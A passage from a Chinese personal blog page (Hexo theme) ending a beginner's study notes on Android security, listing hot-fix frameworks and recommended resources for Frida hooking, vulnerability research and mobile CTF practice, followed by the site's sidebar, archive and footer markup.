+<li>java hook：aceso，robust</li>
+<li>dex替换：amigo，tinker</li>
+<li>混合优化：sophix</li>
+</ul>
+<p>热修复具体内容可以从这看 <a href="https://www.cnblogs.com/popfisher/p/8543973.html">https://www.cnblogs.com/popfisher/p/8543973.html</a></p>
+<p>其余的一些好资源推荐：</p>
+<p><strong>hook以及frida</strong>：</p>
+<ul>
+<li>看雪学院有js api文档，当然看官方文档也很舒服</li>
+<li>rosye大大的系列文章：<a href="https://github.com/r0ysue/AndroidSecurityStudy">https://github.com/r0ysue/AndroidSecurityStudy</a></li>
+<li>泉哥博客关于frida fuzz的一些内容：<a href="http://riusksk.me/2019/11/30/Frida%E6%A1%86%E6%9E%B6%E5%9C%A8Fuzzing%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/">http://riusksk.me/2019/11/30/Frida%E6%A1%86%E6%9E%B6%E5%9C%A8Fuzzing%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/</a></li>
+<li>project zero：Adventures in Video Conferencing系列</li>
+<li>蒸米师傅的安卓七种武器hook篇，清晰的介绍了一个轻便的hook框架</li>
+</ul>
+<p><strong>漏洞挖掘</strong></p>
+<ul>
+<li>瘦蛟舞大大的文章：<a href="https://github.com/WooyunDota/DroidDrops">https://github.com/WooyunDota/DroidDrops</a></li>
+<li>乌云历史镜像 ：）</li>
+</ul>
+<p><strong>练习题</strong></p>
+<ul>
+<li>只做过攻防世界的，感觉一般，不太推荐。。。</li>
+<li>GitHub上有一个awesome mobile ctf，推荐下：<a href="https://github.com/xtiankisutsa/awesome-mobile-CTF">https://github.com/xtiankisutsa/awesome-mobile-CTF</a></li>
+</ul>
+<p><strong>综合</strong></p>
+<ul>
+<li>看雪啊。。。还用想吗</li>
+</ul>
+<p>这篇纯粹是水文，本来是打算放自己博客的，但后来一想放下自己的学习笔记或许对和我一样的小白们在道路上会有所帮助。下次尽可能放些漏洞挖掘，fuzz以及有意思的mobile题：）</p>
+</div><div class="article-tags size-small is-uppercase mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/notes/">notes</a></div><!--!--></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2020/02/24/2020-2-24-CVE-2010-2883/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">CVE-2010-2883栈溢出漏洞</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2020/02/24/2020-2-24-CVE-2019-2234/"><span class="level-item">cve-2019-2234组件暴露漏洞分析</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><!--!--></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1"><div class="card widget"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="is-rounded" src="/img/kkx.jpg" alt="Dawuge"></figure><p class="title is-size-4 is-block line-height-inherit">Dawuge</p><p class="is-size-6 is-block">Never limit yourself</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>HNUer</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">32</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">17</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">4</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/Dawuge" target="_blank" rel="noopener">follow 一下</a></div><div class="level is-mobile"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/Dawuge"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Facebook" href="https://facebook.com"><i class="fab fa-facebook"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Twitter" href="https://twitter.com"><i class="fab fa-twitter"></i></a></div></div></div><!--!--><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">友链</h3><ul class="menu-list"><li><a class="level is-mobile is-mobile" href="http://momomoxiaoxi.com/" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">默小西</span></span><span class="level-right"><span class="level-item tag">momomoxiaoxi.com</span></span></a></li><li><a class="level is-mobile is-mobile" href="https://nan01ab.github.io/archive" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">nan01ab</span></span><span class="level-right"><span class="level-item tag">nan01ab.github.io</span></span></a></li><li><a class="level is-mobile is-mobile" href="https://n1rv0us.github.io/" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">n1rv0us</span></span><span class="level-right"><span class="level-item tag">n1rv0us.github.io</span></span></a></li><li><a class="level is-mobile is-mobile" href="https://www.wenweizeng.com" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">薇薇</span></span><span class="level-right"><span class="level-item tag">www.wenweizeng.com</span></span></a></li></ul></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">分类</h3><ul class="menu-list"><li><a class="level is-mobile is-marginless" href="/categories/ctf/"><span class="level-start"><span class="level-item">ctf</span></span><span class="level-end"><span class="level-item tag">10</span></span></a><ul class="mr-0"><li><a class="level is-mobile is-marginless" href="/categories/ctf/pwn/"><span class="level-start"><span class="level-item">pwn</span></span><span class="level-end"><span class="level-item tag">10</span></span></a></li></ul></li><li><a class="level is-mobile is-marginless" href="/categories/fuzz/"><span class="level-start"><span class="level-item">fuzz</span></span><span class="level-end"><span class="level-item tag">6</span></span></a><ul class="mr-0"><li><a class="level is-mobile is-marginless" href="/categories/fuzz/android/"><span class="level-start"><span class="level-item">android</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/fuzz/kernel/"><span class="level-start"><span class="level-item">kernel</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/fuzz/normal/"><span class="level-start"><span class="level-item">normal</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li></ul></li><li><a class="level is-mobile is-marginless" href="/categories/notes/"><span class="level-start"><span class="level-item">notes</span></span><span class="level-end"><span class="level-item tag">10</span></span></a><ul class="mr-0"><li><a class="level is-mobile is-marginless" href="/categories/notes/android/"><span class="level-start"><span class="level-item">android</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/notes/env/"><span class="level-start"><span class="level-item">env</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/notes/hardware/"><span class="level-start"><span class="level-item">hardware</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/notes/linux/"><span class="level-start"><span class="level-item">linux</span></span><span class="level-end"><span class="level-item tag">5</span></span></a></li></ul></li><li><a class="level is-mobile is-marginless" href="/categories/vul/"><span class="level-start"><span class="level-item">vul</span></span><span class="level-end"><span class="level-item tag">4</span></span></a><ul class="mr-0"><li><a class="level is-mobile is-marginless" href="/categories/vul/android/"><span class="level-start"><span class="level-item">android</span></span><span class="level-end"><span class="level-item tag">3</span></span></a><ul class="mr-0"><li><a class="level is-mobile is-marginless" href="/categories/vul/android/kernel/"><span class="level-start"><span class="level-item">kernel</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/vul/android/software/"><span class="level-start"><span class="level-item">software</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></li><li><a class="level is-mobile is-marginless" href="/categories/vul/windows/"><span class="level-start"><span class="level-item">windows</span></span><span class="level-end"><span class="level-item tag">1</span></span></a><ul class="mr-0"><li><a class="level is-mobile is-marginless" href="/categories/vul/windows/software/"><span class="level-start"><span class="level-item">software</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></li></ul></li></ul></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">标签</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/ctf/"><span class="tag">ctf</span><span class="tag is-grey-lightest">10</span></a></div><div class="control"><a class="tags has-addons" href="/tags/fuzz/"><span class="tag">fuzz</span><span class="tag is-grey-lightest">6</span></a></div><div class="control"><a class="tags has-addons" href="/tags/notes/"><span class="tag">notes</span><span class="tag is-grey-lightest">10</span></a></div><div class="control"><a class="tags has-addons" href="/tags/vul/"><span class="tag">vul</span><span class="tag is-grey-lightest">4</span></a></div></div></div></div></div><div class="column-right-shadow is-hidden-widescreen"></div></div><div class="column column-right is-4-tablet is-4-desktop is-3-widescreen is-hidden-touch is-hidden-desktop-only order-3"><div class="card widget"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content size-small"><p><time dateTime="2099-12-31T16:00:00.000Z">2100-01-01</time></p><p class="title is-6"><a class="link-muted" href="/2100/01/01/2100-1-1-dailyrecord/">日志</a></p><p class="is-uppercase"></p></div></article><article class="media"><div class="media-content size-small"><p><time dateTime="2098-12-31T16:00:00.000Z">2099-01-01</time></p><p class="title is-6"><a class="link-muted" href="/2099/01/01/2099-1-1-cundang/">在其他平台放置的文章</a></p><p class="is-uppercase"></p></div></article><article class="media"><div class="media-content size-small"><p><time dateTime="2020-03-31T16:00:00.000Z">2020-04-01</time></p><p class="title is-6"><a class="link-muted" href="/2020/04/01/android%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%BA%8C/">android kernel exploit第二弹</a></p><p class="is-uppercase"><a class="link-muted" href="/categories/vul/">vul</a> / <a class="link-muted" href="/categories/vul/android/">android</a> / <a class="link-muted" href="/categories/vul/android/kernel/">kernel</a></p></div></article><article class="media"><div class="media-content size-small"><p><time dateTime="2020-02-29T16:00:00.000Z">2020-03-01</time></p><p class="title is-6"><a class="link-muted" href="/2020/03/01/%E6%90%AD%E5%BB%BAandroid%E5%86%85%E6%A0%B8%E7%8E%AF%E5%A2%83(%E9%A1%BA%E5%B8%A6%E5%88%86%E6%9E%90cve-2013-1763)/">搭建android内核环境（顺带分析cve-2013-1763)</a></p><p class="is-uppercase"><a class="link-muted" href="/categories/vul/">vul</a> / <a class="link-muted" href="/categories/vul/android/">android</a> / <a class="link-muted" href="/categories/vul/android/kernel/">kernel</a></p></div></article><article class="media"><div class="media-content size-small"><p><time dateTime="2020-02-23T16:00:00.000Z">2020-02-24</time></p><p class="title is-6"><a class="link-muted" href="/2020/02/24/2020-2-24-CVE-2010-2883/">CVE-2010-2883栈溢出漏洞</a></p><p class="is-uppercase"><a class="link-muted" href="/categories/vul/">vul</a> / <a class="link-muted" href="/categories/vul/windows/">windows</a> / <a class="link-muted" href="/categories/vul/windows/software/">software</a></p></div></article></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile is-marginless" href="/archives/2100/01/"><span class="level-start"><span class="level-item">一月 2100</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2099/01/"><span class="level-start"><span class="level-item">一月 2099</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/04/"><span class="level-start"><span class="level-item">四月 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/03/"><span class="level-start"><span class="level-item">三月 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/02/"><span class="level-start"><span class="level-item">二月 2020</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2019/12/"><span class="level-start"><span class="level-item">十二月 2019</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2019/11/"><span class="level-start"><span class="level-item">十一月 2019</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2019/10/"><span class="level-start"><span class="level-item">十月 2019</span></span><span class="level-end"><span class="level-item tag">6</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2019/09/"><span class="level-start"><span class="level-item">九月 2019</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2019/08/"><span class="level-start"><span class="level-item">八月 2019</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2019/06/"><span class="level-start"><span class="level-item">六月 2019</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2019/05/"><span class="level-start"><span class="level-item">五月 2019</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li></ul></div></div></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/" alt="Dawuge&#039;s blog" height="28"></a><p class="size-small"><span>&copy; 2020 Dawuge</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script>moment.locale("zh-CN");</script><script>var IcarusThemeSettings = {
+            site: {
+                url: 'http://yoursite.com',
+                external_link: {"enable":true,"exclude":[]}
+            },
+            article: {
+                highlight: {
+                    clipboard: true,
+                    fold: 'unfolded'
+                }
+            }
+        };</script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
+            if (typeof $.fn.lightGallery === 'function') {
+                $('.article').lightGallery({ selector: '.gallery-item' });
+            }
+            if (typeof $.fn.justifiedGallery === 'function') {
+                if ($('.justified-gallery > p > .gallery-item').length) {
+                    $('.justified-gallery > p > .gallery-item').unwrap();
+                }
+                $('.justified-gallery').justifiedGallery();
+            }
+        });</script><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
+            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
+        });</script></body></html>
